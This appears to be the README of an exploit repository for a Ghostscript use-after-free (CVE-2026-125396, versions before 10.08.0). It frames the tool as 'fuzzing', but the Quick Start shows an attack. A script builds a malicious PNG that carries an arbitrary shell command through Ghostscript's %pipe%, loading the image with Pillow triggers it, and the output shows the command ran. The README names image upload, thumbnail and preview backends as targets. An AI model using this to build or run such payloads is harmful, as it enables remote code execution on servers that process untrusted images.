# CVE-2026-125396 
[![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
![Static Badge](https://img.shields.io/badge/CVE--2026--125396-Critical-red?style=for-the-badge)
(https://nvd.nist.gov/vuln/detail/cve-2026-125396)
[![Static Badge](https://img.shields.io/badge/CVSS%20v4.0-8.5-critical?style=for-the-badge)]()



**Referer**: https://pwn.ai/upload2shell/research.html

**Scope**: Ghostscript < 10.08.0

A fuzzing-enabled version of upload2shell; supports fuzzing on 64-bit LP64, other architectures are not covered.

# TL;DR

This is a logical UAF, address-independent, so you can prebuild a fuzz image that can fuzz a large number of versions at once. That is what makes it a bit like 24shell.

Similar to the Log4j approach: image/document uploads, thumbnails, printing, preview/import, etc. are all fuzz surfaces; if the backend uses Ghostscript, it can be hit.


## Attack Chain
<img width="1320" height="1087" alt="image" src="https://github.com/user-attachments/assets/6bbe86bb-9ee3-416a-b308-b9408386da83" />




## Quick Start

```bash
# Generate the fuzz image: --cmd controls the %pipe% command; quote it to prevent the shell from treating > as redirection
python3 exp.py --cmd 'id>/tmp/PWN' --out /tmp/exp.png

# Load and trigger
echo 'from PIL import Image
with Image.open("/tmp/exp.png") as image:
    image.load()' | python3

cat /tmp/PWN
# uid=1000(debian) gid=1000(debian) ....
```

---

**Authorized for technical research only. The author assumes no responsibility for any consequences.**
